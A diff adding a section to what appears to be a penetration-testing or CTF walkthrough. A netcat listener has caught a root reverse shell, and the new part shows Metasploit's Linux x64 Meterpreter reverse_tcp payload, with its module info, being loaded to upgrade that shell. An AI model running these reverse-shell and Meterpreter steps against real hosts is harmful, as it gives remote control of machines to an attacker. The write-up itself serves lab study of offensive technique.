@@ -254,3 +254,38 @@ connect to [10.1.10.56] from (UNKNOWN) [10.1.10.196] 53822
 whoami
 root
 ```
+
+# Upgrade the shell
+```
+msf > use payload/linux/x64/meterpreter/reverse_tcp 
+msf payload(linux/x64/meterpreter/reverse_tcp) > info
+
+       Name: Linux Mettle x64, Reverse TCP Stager
+     Module: payload/linux/x64/meterpreter/reverse_tcp
+   Platform: Linux, Linux
+       Arch: x64
+Needs Admin: No
+ Total size: 130
+       Rank: Normal
+
+Provided by:
+  Brent Cook <bcook@rapid7.com>
+  ricky
+  tkmru
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Inject the mettle server payload (staged).
+
+  Connect back to the attacker
+
+
+
+View the full module info with the info -d command.
+```
+
